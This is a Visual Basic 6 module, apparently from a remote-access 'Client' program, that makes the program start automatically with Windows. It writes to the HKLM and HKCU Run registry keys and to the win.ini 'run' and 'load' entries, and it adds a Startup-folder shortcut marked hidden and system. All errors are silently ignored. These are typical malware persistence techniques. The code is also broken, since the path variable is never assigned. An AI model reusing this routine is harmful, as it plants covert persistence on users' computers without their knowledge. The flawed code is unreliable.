Attribute VB_Name = "modStartup"
Option Explicit

Public Sub AddStartup()
    On Local Error Resume Next
    Dim strPath As String
    
    'RegRun
    Call SaveString(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", Client.EXEName, strPath)
    Call SaveString(HKEY_CURRENT_USER, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", Client.EXEName, strPath)
    
    'WinINIRun
    WriteINI "windows", "run", Client.FullPath, Client.WindowsDir & "/win.ini"
    
    'WinINILoad
    WriteINI "windows", "load", Client.FullPath, Client.WindowsDir & "/win.ini"
    
    'Start menu shortcut
    Dim strStartMenu As String
    Dim sh As Object, link As Object
        
    Set sh = CreateObject("WScript.Shell")
    strStartMenu = sh.SpecialFolders("StartMenu") & "\Programs\Startup\" & Client.EXEName & ".lnk"
        
    Set link = sh.CreateShortcut(strStartMenu)
        
    link.TargetPath = strPath
    link.Save
    
    Call SetAttr(strStartMenu, vbHidden + vbSystem)
End Sub

Public Sub RemoveStartup()
    On Local Error Resume Next
    
    'RegRun
    Call DeleteValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", Client.EXEName)
    Call DeleteValue(HKEY_CURRENT_USER, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", Client.EXEName)
    
    'WinINIRun
    WriteINI "windows", "run", "", Client.WindowsDir & "/win.ini"
    
    'WinINILoad
    WriteINI "windows", "load", "", Client.WindowsDir & "/win.ini"
    
    'Start Menu
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    Call DeleteFile(sh.SpecialFolders("StartMenu") & "\Programs\Startup\" & Client.EXEName & ".lnk")
End Sub
